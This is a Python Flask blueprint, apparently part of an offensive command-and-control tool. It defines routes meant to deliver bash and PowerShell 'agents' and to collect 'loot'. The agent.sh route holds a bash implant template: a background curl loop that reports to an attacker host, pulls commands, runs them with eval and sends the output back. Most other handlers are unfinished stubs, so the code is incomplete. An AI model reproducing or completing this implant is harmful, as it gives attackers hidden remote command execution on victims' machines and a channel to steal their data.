from meuk.hacksec import *
from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response

agent_bp = Blueprint('agent_bp', __name__,
                    template_folder='meuk/templates',
                    static_folder='meuk/static')


#handle uploads writes to raw loot, fetches the ip creates a folder and saves the file
@agent_bp.route("/agent/g/<session>/<req>", methods=["POST", "GET"])

def agents_get():
    #check in op sessieis
    session = 1
    req = 1


    #


#handle uploads writes to raw loot, fetches the ip creates a folder and saves the file
@agent_bp.route("/agent/r/<session>/<req>", methods=["POST", "GET"])

def agents_ret():
    #check in op sessieis
    session = 1
    req = 1


    #




#deliver a curl agent
@agent_bp.route("/agent.sh", methods=["POST", "GET"])

def agents_sh():
    payload = """data = 'nohup bash -c \'s=*LHOST*&&i=*SESSIONID*&&hname=$(hostname)&&p=http://;curl -s "$p$s/*VERIFY*/$hname/$USER" -H "*HOAXID*: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/*GETCMD*" -H "*HOAXID*: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/*POSTRES* -X POST -H "*HOAXID*: $i" -d "$r";echo $$;fi; fi; sleep *FREQ*; done;\' & disown'"""


#deliver a powershell agent
@agent_bp.route("/agent.ps1", methods=["POST", "GET"])
def agents_ps():
    #check in op sessieis
    session = base64.decode
    req = base64.decode


    #